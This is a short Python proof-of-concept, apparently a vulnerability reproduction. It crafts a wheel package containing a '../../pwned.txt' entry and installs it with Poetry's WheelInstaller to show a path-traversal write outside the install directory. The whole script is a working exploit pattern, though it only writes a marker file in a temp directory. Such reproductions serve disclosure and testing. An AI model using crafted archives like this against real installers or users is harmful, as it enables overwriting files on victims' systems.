import tempfile, zipfile
from pathlib import Path
from poetry.installation.wheel_installer import WheelInstaller

class Env:
    def __init__(self, root):
        self.scheme_dict = {k: str(root / "env" / k) for k in ["purelib", "platlib", "scripts", "data", "include"]}
        self.python = Path("/usr/bin/python3")

root = Path(tempfile.mkdtemp()).resolve()
whl = root / "evil-1.0-py3-none-any.whl"
with zipfile.ZipFile(whl, "w") as z:
    z.writestr("../../pwned.txt", b"pwned")
    z.writestr("evil-1.0.dist-info/METADATA", "Metadata-Version: 2.1\nName: evil\nVersion: 1.0\n")
    z.writestr("evil-1.0.dist-info/WHEEL", "Wheel-Version: 1.0\nGenerator: x\nRoot-Is-Purelib: true\nTag: py3-none-any\n")
    z.writestr("evil-1.0.dist-info/RECORD", "")

WheelInstaller(Env(root)).install(whl)
print((root / "pwned.txt").read_bytes())
